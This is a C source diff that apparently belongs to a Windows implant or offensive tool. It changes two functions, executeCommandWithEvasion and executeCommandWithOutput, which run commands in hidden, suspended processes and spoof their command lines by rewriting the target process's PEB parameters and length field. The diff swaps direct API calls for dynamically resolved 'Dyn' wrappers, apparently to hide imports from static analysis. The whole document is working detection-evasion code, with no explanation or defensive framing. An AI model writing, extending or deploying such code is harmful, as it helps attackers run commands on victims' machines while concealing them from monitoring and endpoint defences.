@@ -5,6 +5,8 @@
 #include <stddef.h>
 #include <stdlib.h>
 
+#include "dynamic_linking.h"
+
 #define OUTPUT_BUFFER_SIZE 65536
 
 BOOL executeCommandWithEvasion(const char *command);
@@ -61,31 +63,31 @@ BOOL executeCommandWithEvasion(const char *command) {
     MultiByteToWideChar(CP_UTF8, 0, spoofedCmdline, -1, spoofedCmdlineW, spoofedCmdlineLen);
 
     // Create process in suspended state with spoofed cmdline and hidden window
-    if (!CreateProcessA(NULL, spoofedCmdline, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si.StartupInfo, &pi)) {
+    if (!DynCreateProcessA(NULL, spoofedCmdline, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si.StartupInfo, &pi)) {
         goto cleanup;
     }
 
     // Query process basic information to get PEB address
     PROCESS_BASIC_INFORMATION pbi;
     ULONG ret;
-    if (NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &ret) != 0) {
+    if (DynNtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &ret) != 0) {
         goto cleanup;
     }
 
     // Read the PEB structure from remote process
     PEB peb;
-    if (!ReadProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
+    if (!DynReadProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
         goto cleanup;
     }
 
     // Read the RTL_USER_PROCESS_PARAMETERS structure
     RTL_USER_PROCESS_PARAMETERS procParams;
-    if (!ReadProcessMemory(pi.hProcess, peb.ProcessParameters, &procParams, sizeof(procParams), NULL)) {
+    if (!DynReadProcessMemory(pi.hProcess, peb.ProcessParameters, &procParams, sizeof(procParams), NULL)) {
         goto cleanup;
     }
 
     // Overwrite the command line with the real command
-    if (!WriteProcessMemory(pi.hProcess, procParams.CommandLine.Buffer, realCmdlineW, realCmdlineLen * sizeof(wchar_t), NULL)) {
+    if (!DynWriteProcessMemory(pi.hProcess, procParams.CommandLine.Buffer, realCmdlineW, realCmdlineLen * sizeof(wchar_t), NULL)) {
         goto cleanup;
     }
 
@@ -96,12 +98,12 @@ BOOL executeCommandWithEvasion(const char *command) {
     USHORT newLength = (wcslen(spoofedCmdlineW) - 1) * sizeof(wchar_t);  // Exclude null terminator
     
     // Write the new length to hide the real arguments
-    if (!WriteProcessMemory(pi.hProcess, lengthAddress, &newLength, sizeof(USHORT), NULL)) {
+    if (!DynWriteProcessMemory(pi.hProcess, lengthAddress, &newLength, sizeof(USHORT), NULL)) {
         goto cleanup;
     }
 
     // Resume the main thread to execute the process
-    if (ResumeThread(pi.hThread) == (DWORD)-1) {
+    if (DynResumeThread(pi.hThread) == (DWORD)-1) {
         goto cleanup;
     }
 
@@ -160,7 +162,7 @@ char* executeCommandWithOutput(const char *command) {
     si.StartupInfo.wShowWindow = SW_HIDE;
     si.StartupInfo.hStdOutput = hWritePipe;
     si.StartupInfo.hStdError = hWritePipe;
-    si.StartupInfo.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
+    si.StartupInfo.hStdInput = DynGetStdHandle(STD_INPUT_HANDLE);
 
     // Create spoofed cmdline (everything after first space becomes spaces)
     char spoofedCmdline[MAX_PATH];
@@ -183,31 +185,31 @@ char* executeCommandWithOutput(const char *command) {
     MultiByteToWideChar(CP_UTF8, 0, spoofedCmdline, -1, spoofedCmdlineW, spoofedCmdlineLen);
 
     // Create process in suspended state with spoofed cmdline and hidden window
-    if (!CreateProcessA(NULL, spoofedCmdline, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si.StartupInfo, &pi)) {
+    if (!DynCreateProcessA(NULL, spoofedCmdline, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si.StartupInfo, &pi)) {
         goto cleanup;
     }
 
     // Query process basic information to get PEB address
     PROCESS_BASIC_INFORMATION pbi;
     ULONG ret;
-    if (NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &ret) != 0) {
+    if (DynNtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &ret) != 0) {
         goto cleanup;
     }
 
     // Read the PEB structure from remote process
     PEB peb;
-    if (!ReadProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
+    if (!DynReadProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
         goto cleanup;
     }
 
     // Read the RTL_USER_PROCESS_PARAMETERS structure
     RTL_USER_PROCESS_PARAMETERS procParams;
-    if (!ReadProcessMemory(pi.hProcess, peb.ProcessParameters, &procParams, sizeof(procParams), NULL)) {
+    if (!DynReadProcessMemory(pi.hProcess, peb.ProcessParameters, &procParams, sizeof(procParams), NULL)) {
         goto cleanup;
     }
 
     // Overwrite the command line with the real command
-    if (!WriteProcessMemory(pi.hProcess, procParams.CommandLine.Buffer, realCmdlineW, realCmdlineLen * sizeof(wchar_t), NULL)) {
+    if (!DynWriteProcessMemory(pi.hProcess, procParams.CommandLine.Buffer, realCmdlineW, realCmdlineLen * sizeof(wchar_t), NULL)) {
         goto cleanup;
     }
 
@@ -218,22 +220,22 @@ char* executeCommandWithOutput(const char *command) {
     USHORT newLength = (wcslen(spoofedCmdlineW) - 1) * sizeof(wchar_t);  // Exclude null terminator
     
     // Write the new length to hide the real arguments
-    if (!WriteProcessMemory(pi.hProcess, lengthAddress, &newLength, sizeof(USHORT), NULL)) {
+    if (!DynWriteProcessMemory(pi.hProcess, lengthAddress, &newLength, sizeof(USHORT), NULL)) {
         goto cleanup;
     }
 
     // Resume the main thread to execute the process
-    if (ResumeThread(pi.hThread) == (DWORD)-1) {
+    if (DynResumeThread(pi.hThread) == (DWORD)-1) {
         goto cleanup;
     }
 
     // Close write end of pipe so ReadFile will return when process exits
-    CloseHandle(hWritePipe);
+    DynCloseHandle(hWritePipe);
     hWritePipe = NULL;
 
     // Read output from pipe
     char tempBuffer[4096];
-    while (ReadFile(hReadPipe, tempBuffer, sizeof(tempBuffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
+    while (DynReadFile(hReadPipe, tempBuffer, sizeof(tempBuffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
         if (totalBytesRead + bytesRead < OUTPUT_BUFFER_SIZE - 1) {
             memcpy(buffer + totalBytesRead, tempBuffer, bytesRead);
             totalBytesRead += bytesRead;
@@ -270,10 +272,10 @@ cleanup:
     if (buffer) free(buffer);
     if (realCmdlineW) free(realCmdlineW);
     if (spoofedCmdlineW) free(spoofedCmdlineW);
-    if (hReadPipe) CloseHandle(hReadPipe);
-    if (hWritePipe) CloseHandle(hWritePipe);
-    if (pi.hProcess) CloseHandle(pi.hProcess);
-    if (pi.hThread) CloseHandle(pi.hThread);
+    if (hReadPipe) DynCloseHandle(hReadPipe);
+    if (hWritePipe) DynCloseHandle(hWritePipe);
+    if (pi.hProcess) DynCloseHandle(pi.hProcess);
+    if (pi.hThread) DynCloseHandle(pi.hThread);
     
     return output;
 }
